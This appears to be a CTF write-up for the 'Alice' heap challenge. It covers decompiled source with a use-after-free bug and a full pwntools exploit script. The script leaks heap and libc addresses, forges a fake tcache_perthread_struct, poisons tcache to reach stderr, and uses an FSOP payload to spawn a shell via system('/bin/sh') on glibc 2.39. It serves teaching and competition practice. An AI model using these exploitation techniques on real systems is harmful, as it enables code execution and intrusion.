---
title: "[0xLaugh-CTF 2026]-Pwn/Alice"
published: 2026-01-29
description: "Forge fake pthread_struct to bypass Free count check then overwrite stderr to get profit."
tags: ["pwn", "heap","fsop",]
category: Heap

---
### Overview
This is the writeup of the heap challenge that I solved in laugh ctf.The binary implemented a ```free count``` check that allow user to free up to 7 chunks,Means we can't use the method of filling tcache bins to put the next chunk in ```unsorted bin``` to get libc leak.So we have to construct fake pthread_struct to bypass free count check.

```md
GNU C Library (Ubuntu GLIBC 2.39-0ubuntu8.6) stable release version 2.39.
Copyright (C) 2024 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.
There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A
PARTICULAR PURPOSE.
Compiled by GNU CC version 13.3.0.
libc ABIs: UNIQUE IFUNC ABSOLUTE
Minimum supported kernel: 3.2.0
For bug reporting instructions, please see:
<https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs>.
gef> checksec
Basic information 
Canary                                  : Enabled
NX                                      : Enabled
PIE                                     : Enabled
RELRO                                   : Full RELRO
Fortify                                 : Not found

```
In ```libc-2.39```,Pointers in ```tcache``` bins are ```mangled``` but we can easily bypass the ```mangling```.

### Source code 

```c
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  int choice;

  setbuf(stdin, 0LL);
  setbuf(_bss_start, 0LL);
  setbuf(stderr, 0LL);
  puts("Not all memories are kind — but we must face them nonetheless.");
  while ( 1 )
  {
    menu();
    choice = read_choice();
    if ( choice == 5 )
    {
      puts("Alice closes her eyes and leaves Wonderland...");
      exit(0);
    }
    if ( choice > 5 )
    {
      puts("That choice is not real.");
    }
    else
    {
      switch ( choice )
      {
        case 4:
          forget_memory();
          break;
        case 3:
          view_memory();
          break;
        case 1:
          create_memory();
          break;
        case 2:
          edit_memory();
          break;
        default:
          goto ;
      }
    }
  }
}
```
This is the ```main``` function,It's just prompts user a ```menu```.
```c
int create_memory()
{
  int v1; 
  signed int choice; 
  size_t size; 

  printf("Memory index: ");
  choice = read_choice();
  if ( (unsigned int)choice > 8 )
    return puts(aThatMemoryDoes);
  if ( *((_QWORD *)&memories + choice) )
    return puts("Something was there already.. may wanna save somewehre else.");
  printf("How vivid is this memory? ");
  v1 = read_choice();
  size = v1;
  if ( !v1 || (unsigned __int64)v1 > 0x300 )
    return puts("That memory is too distorted to hold.");
  *((_QWORD *)&memories + choice) = malloc(v1);
  printf("What do you remember? ");
  read(0, *((void **)&memories + choice), size);
  return puts("As if it happened yesterday...");
}
int view_memory()
{
  unsigned int choice; 

  printf("Which memory do you wish to recall? ");
  choice = read_choice();
  if ( choice <= 8 )
    return puts(*((const char **)&memories + (int)choice));
  else
    return puts("Weird... I don't remember that.");
}
int edit_memory()
{
  signed int choice; 
  size_t nbytes; 

  printf("Which memory will you rewrite? ");
  choice = read_choice();
  if ( (unsigned int)choice > 8 || !*((_QWORD *)&memories + choice) )
    return puts("I can't get myself to remember what happened that time.");
  nbytes = malloc_usable_size(*((void **)&memories + choice));
  printf("Rewrite your memory: ");
  read(0, *((void **)&memories + choice), nbytes);
  return puts("The past bends under your will...");
}
int forget_memory()
{
  signed int choice; 

  if ( free_count > 6 )
    return puts("Some memories refuse to fade...");
  printf("Which memory will you erase? ");
  choice = read_choice();
  if ( (unsigned int)choice > 8 || !*((_QWORD *)&memories + choice) )
    return puts("Idk.");
  free(*((void **)&memories + choice));
  ++free_count;
  return puts("What was that about again?");
}

```
In create memory, we can ```malloc``` upto ```0x300 size``` and the chunk pointers will be stored in ```.bss section```. In view memory and edit memory ,There is ```no check``` to ensure that ```chunk is freed``` or not .In forget memory functions,Pointers in ```.bss section``` is not cleared after ```freeing``` it so we get ```UAF``` primtive.The free count is increased on every ```forget_memory call``` so we get maximum of 7 free and 7 malloc.

### Exploitation 

The exploitation part is pretty simple.There is ```UAF``` vuln so we can get ```Heap leak``` pretty easily. Then we can forge ```fake pthread_struct``` to fake free count so that on next free  the chunk will go to ```unsorted bin```.And using UAF primtive we can get ```libc leak```.
Once we get libc leak ,There is many ways to get shell using ```arbitrary write``` primtive.I overwrote ```stderr``` struct then called ```exit``` to execute ```system("/bin/sh").```I think this method is called ```House of Apple 3```.

```python
from pwn import *
elf  = context.binary = ELF("./vuln_patched")
context.log_level = "Debug"

io = process()
# gdb.attach(io)
def malloc(index,size,data):
    io.sendlineafter(b">",b"1")
    io.sendlineafter(b"index:",str(index))
    io.sendlineafter(b"memory?",str(size))
    io.sendlineafter(b"remember?",data)
    
def edit(index,data):
    io.sendlineafter(b">",b"2")
    io.sendlineafter(b"rewrite?",str(index))    
    io.sendlineafter(b"memory:",data)

def view(index):
    io.sendlineafter(b">",b"3")
    io.sendlineafter(b"recall?",str(index))   
   
def free(index):
    io.sendlineafter(b">",b"4")
    io.sendlineafter(b"erase?",str(index))   
    
    
malloc(0,0xf0,b"A")
malloc(1,0xf0,b"B")
malloc(2,0x100,b"C")
malloc(3,0xf0,b"D")    

free(0x0)
view(0x0)
heap_leak = unpack(io.recvn(0x6),"all")
heap_leak = (heap_leak>>8)<<12

free(0x1)
edit(0x1,pack((heap_leak+0x10)^heap_leak>>12))
malloc(4,0xf0,b"")
malloc(5,0xf0,b"")

fake_pthread = pack(0x2)+pack(0x0)+pack(0x0)+p32(0x0)+p8(0x0)+p8(0x0)+p8(0x7)

edit(5,(fake_pthread))
free(0x2)
view(0x2)
io.recvn(0x1)
libc_leak = unpack(io.recvn(0x6),"all")-0x203b20

log.critical(f"heap base:{hex(heap_leak)}")
log.critical(f"libc base:{hex(libc_leak)}")

free(0x3)
free(0x4)

stderr = pack((libc_leak+0x2044e0)^(heap_leak>>12))
edit(0x4,stderr)


#FSOP#
system_addr =libc_leak+0x58750

libc_base = libc_leak
stderr_address = libc_base+0x2044e0

fake_wide_data = stderr_address-0x48
wide_vtable  = stderr_address



lock = libc_base+0x205700
fake_stderr_vtable = libc_base+0x202228##jumps

chain = libc_base+0x2045c0

payload =pack(0x3b01010101010101)#0x0
payload+=b"/bin/sh\x00"#0x8

payload+=pack(0x0)#0x10

payload+=b"\x00"*(0x20-0x18)

payload +=pack(0x0)#0x20
payload+=pack(0x1)#0x28

payload+=p8(0x0)*(0x60-0x30)

payload+=pack(system_addr)#60
payload+=pack(chain)#68

payload+=p8(0x0)*(0x88-0x70)

payload+=pack(lock)#0x88
payload+=p8(0x0)*(0x98-0x90)#0x90
payload+=pack(wide_vtable-0x8)#0x98
payload+=p8(0x0)*(0xa0-0x90-0x10)

payload+=pack(fake_wide_data)#a0
payload+=pack(0x0)#a8
payload+=p8(0x0)*(0xd8-0xa8-0x8)

payload+=pack(fake_stderr_vtable)

print(f"fake wide data address = {hex(fake_wide_data)}")

print(f"fake_wide vtable address is {hex(wide_vtable)}")

malloc(0x6,0xf0,b"a")
malloc(0x7,0xf0,payload)

io.sendline(b"5")
io.interactive()
#pthread struct-> snap after freeing one 0x100 chunk->we have to  overwrite that free count of 0x1->0x7
# 0x5c792dc98000|+0x00000|+0x00000: 0x0000000000000000 0x0000000000000291 | ................ |
# 0x5c792dc98010|+0x00010|+0x00010: 0x0000000000000002 0x0000000000000000 | ................ |
# 0x5c792dc98020|+0x00020|+0x00020: 0x0000000000000000 0x0001000000000000 | ................ |
# 0x5c792dc98030|+0x00030|+0x00030: 0x0000000000000000 0x0000000000000000 | ................ |
# 0x5c792dc98040|+0x00040|+0x00040: 0x0000000000000000 0x0000000000000000 | ................ |
# 0x5c792dc98050|+0x00050|+0x00050: 0x0000000000000000 0x0000000000000000 | ................ |
# 0x5c792dc98060|+0x00060|+0x00060: 0x0000000000000000 0x0000000000000000 | ................ |
# 0x5c792dc98070|+0x00070|+0x00070: 0x0000000000000000 0x0000000000000000 | ................ |
# 0x5c792dc98080|+0x00080|+0x00080: 0x0000000000000000 0x0000000000000000 | ................ |
# 0x5c792dc98090|+0x00090|+0x00090: 0x00005c792dc982c0 0x0000000000000000 | ...-y\.......... |
# 0x5c792dc980a0|+0x000a0|+0x000a0: 0x0000000000000000 0x0000000000000000 | ................ |
# 0x5c792dc980b0|+0x000b0|+0x000b0: 0x0000000000000000 0x0000000000000000 | ................ |
# 0x5c792dc980c0|+0x000c0|+0x000c0: 0x0000000000000000 0x0000000000000000 | ................ |
# 0x5c792dc980d0|+0x000d0|+0x000d0: 0x0000000000000000 0x0000000000000000 | ................ |
# 0x5c792dc980e0|+0x000e0|+0x000e0: 0x0000000000000000 0x0000000000000000 | ................ |
# 0x5c792dc980f0|+0x000f0|+0x000f0: 0x0000000000000000 0x0000000000000000 | ................ |
# 0x5c792dc98100|+0x00100|+0x00100: 0x0000000000000000 0x00005c792dc982e0 | ...........-y\.. |
# 0x5c792dc98110|+0x00110|+0x00110: 0x0000000000000000 0x0000000000000000 | ................ |
# * 23 lines, 0x170 bytes

```









